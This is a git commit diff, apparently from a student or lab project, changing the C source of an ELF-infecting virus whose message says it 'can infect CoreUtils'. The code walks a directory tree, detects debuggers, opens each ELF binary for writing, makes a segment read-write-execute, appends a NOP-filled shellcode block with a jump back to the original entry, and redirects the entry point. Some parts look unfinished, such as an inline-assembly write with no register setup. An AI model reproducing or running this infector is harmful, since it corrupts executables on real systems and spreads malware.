3c85d54193b26a0678eaf7a2d71b59ee3eb132e3
Jiwon Choi <jiwon.choi@kaist.ac.kr>
2018-05-11 00:12:29 -0400

    Finally it also can infect CoreUtilsgit add temp.c !

--- src/sandbox/temp.c
+++ src/sandbox/temp.c
@@ -1,5 +1,5 @@
 #define _XOPEN_SOURCE 500
-//#include <stdio.h>
+#include <stdio.h>
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/time.h>
@@ -12,6 +12,7 @@
 #define SPARE_FDS  (4)
 #define MAX_FDS    (512)
 
+//6144
 
 typedef struct temp_Elf64_Shdr{
   Elf64_Word    sh_name;                /* Section name (string tbl index) */
@@ -59,47 +60,48 @@ int activate(){
     return 1; // 
 }
 
-
+static inline void my_write(int fd, void *buf, int size){
+	__asm__ __volatile__ (  "mov $1, %%eax;"
+							"syscall;"
+							://output
+							://input
+							://chobber
+							);
+}
 
 void change_entrypoint(const char* fpath){
 	int fd, i, shellcodeloc;
 	int is_infected_already = 1;  
 	char jmp2original[15];
+	char shellcode[0x1000];
+	int filesize;
 	Elf64_Shdr shdr;
 	Elf64_Phdr phdr;
 	Elf64_Ehdr ehdr;
 	
 	if(access(fpath,R_OK|W_OK|X_OK)!=0){ 
-		//printf("[ERROR] Permission error(%s)\n",fpath);
+		printf("[ERROR] Permission error(%s)\n",fpath);
 		return 0;
 	}
 	if(!activate()){
-		//printf("[ERROR] Debugger detected(%s)\n",fpath);
+		printf("[ERROR] Debugger detected(%s)\n",fpath);
 		return 0;
 	}
 	fd = open(fpath, O_RDWR); // Cannot open virus file itself.
 	if (fd < 0){
-		//printf("[ERROR] fd error(%s)\n",fpath);
+		printf("[ERROR] fd error(%s)\n",fpath);
 		return 0;
 	}
 	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)){
-		//printf("[ERROR] ehdr read error(%s)\n",fpath);
+		printf("[ERROR] ehdr read error(%s)\n",fpath);
 		return 0;
 	}
 	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F')){ 
-		//printf("[ERROR] not ELF!(%s) \n",fpath);
+		printf("[ERROR] not ELF!(%s) \n",fpath);
 		return 0;
 	}
 	
-	//printf("[INFECTED] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
-	
-	// [01] Add section # for malicious section. (31 --> 32)
-	ehdr.e_shnum = ehdr.e_shnum + 1;
-	lseek(fd, 0, SEEK_SET);
-	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) exit(1); 
-	//printf("[INFECTED] Section header entry num (%s): %d\n", fpath, ehdr.e_shnum);
-	
-	
+	printf("[INFECTED] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
 	
 	// [02] Read page headers info.
 	lseek(fd, ehdr.e_phoff, SEEK_SET); // TAPE : page header start offset
@@ -109,24 +111,25 @@ void change_entrypoint(const char* fpath){
 			return 0;
 		}
 		else{
-			//printf("[INFO] phdr.p_flags = %d, phdr.p_vaddr = 0x%x\n",phdr.p_flags,phdr.p_vaddr);
-			
 			// Find RW_ Data page(Loadable Segment && PF_Read_Write(6)) and add Executable permission.
-			if(phdr.p_type==1 && phdr.p_flags==6){
+			if(phdr.p_type==1 && phdr.p_flags==5){
+				printf("[INFO] phdr.p_flags = %d, phdr.p_vaddr = 0x%x\n",phdr.p_flags,phdr.p_vaddr);
 				lseek(fd, -sizeof(phdr), SEEK_CUR); // go back to start of page header
-				// printf("[BEFORE] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
-				phdr.p_flags=7; // RWX flag
-				phdr.p_filesz += 0x1000; // increase page size --> trigger allocate more pages shellcode.
-				phdr.p_memsz = phdr.p_filesz;  // same reason
-				write(fd, &phdr, sizeof(phdr));
-				//printf("[AFTER] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
+				printf("[BEFORE] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
+				phdr.p_flags=7; 
+				
+				phdr.p_filesz += 0x10000; // 적게주면 불리하니 최대한 많이 줌
+				phdr.p_memsz += 0x10000;  // 적게주면 불리하니 최대한 많이 줌
+				
+				my_write(fd, &phdr, sizeof(phdr));
+				printf("[AFTER ] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
 				is_infected_already = 0; // This binary is not infected already.
 				break; // 대상 phdr를 읽은상태에서 break.
 			}
 		}
 	}
 	if(is_infected_already){
-		//printf("[OOPS] This binary is already infected! Terminate infection routine.\n");
+		printf("[OOPS] This binary is already infected! Terminate infection routine.\n");
 		return 0;
 	}
 	
@@ -134,28 +137,14 @@ void change_entrypoint(const char* fpath){
 	/*---------------------------------------------------------------------------*/
 	// Section header for malicious section. 
 	
+	filesize = ehdr.e_shoff + (ehdr.e_shentsize * (ehdr.e_shnum+1));
+	shellcodeloc = phdr.p_vaddr + filesize; 
+	printf("[NEW] shellcodeloc(0x%x) = phdr.p_vaddr(0x%x) + filesize(0x%x)\n",shellcodeloc, phdr.p_vaddr, filesize);
 	
-	// [03] Add section header (of malicious section)at the end of file.  
-	shdr.sh_name = 0;      
-	shdr.sh_type = 3;      
-	shdr.sh_flags = 0;     
-	shdr.sh_addr = (phdr.p_vaddr & 0xfffffffffffff000) + (phdr.p_filesz & 0xfffffffffffff000) + 0x1000; // Start address of this section.
-	shdr.sh_offset = ehdr.e_shoff + (ehdr.e_shentsize * ehdr.e_shnum); // total size of file. meaning end of file.  
-	shdr.sh_size = 0x1000; 
-	shdr.sh_link = 0;      
-	shdr.sh_info = 0;      
-	shdr.sh_addralign = 1; 
-	shdr.sh_entsize = 0;   
-	//printf("[NEW] shdr.sh_addr(0x%x) = (phdr.p_vaddr(0x%x) & 0xfffffffffffff000) + (phdr.p_filesz(0x%x) & 0xfffffffffffff000) + 0x1000\n",shdr.sh_addr,phdr.p_vaddr,phdr.p_filesz);
-	//printf("[NEW] shdr.sh_addr = 0x%x, shdr.sh_offset = 0x%x\n",shdr.sh_addr,shdr.sh_offset);
-	
-	shellcodeloc = shdr.sh_addr + shdr.sh_offset % 0x1000; //페이지정보는 sh_addr에반영되있으므로 sh_offset에서는페이지정보제거
-	//printf("[NEW] shellcodeloc(0x%x) = hdr.sh_addr(0x%x) + shdr.sh_offset(0x%x)\n",shellcodeloc, shdr.sh_addr, shdr.sh_offset);
-	
-	//printf("[BEFORE] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
+	printf("[BEFORE] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
 
-	lseek(fd,0,SEEK_END); 
-	write(fd, &shdr, sizeof(shdr));
+	lseek(fd,0,SEEK_END);  
+	my_write(fd, &shdr, sizeof(shdr));
 	
 	
 	/*---------------------------------------------------------------------------*/
@@ -190,21 +179,26 @@ void change_entrypoint(const char* fpath){
 	
 	
 	// 섹션헤더끝나고 바로쉘코드집어넣기. lseek필요없음
-	write(fd,jmp2original,sizeof(jmp2original));
+	memset(shellcode,'\x90',0x1000);
+	my_write(fd,shellcode,0x1000 - sizeof(jmp2original));
+	my_write(fd,jmp2original,sizeof(jmp2original));
+	
 	
 	//엔트리포인트 수정하기
 	ehdr.e_entry = shellcodeloc;
 	lseek(fd, 0, SEEK_SET);
-	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 0; //write 실패
-	//printf("Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
+	//if (my_write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 0; //write 실패
+	my_write(fd, &ehdr, sizeof(ehdr));
+	printf("[After ]Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
 	
 }
 
 int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s){
     int ret = 0;
-    if (flag == FTW_F && activate()) 
+    if (flag == FTW_F && activate()) {
 		change_entrypoint(fpath);
-        
+		printf("\n");
+	}
     return ret;
 }
 
@@ -219,6 +213,6 @@ int main(int argc, char* argv[])
     nftw(ROOT_DIR, file_process, nfds, FTW_PHYS);
     exit(0);
 }
-
+//ls new entry point : 0x61feb8?
 
 
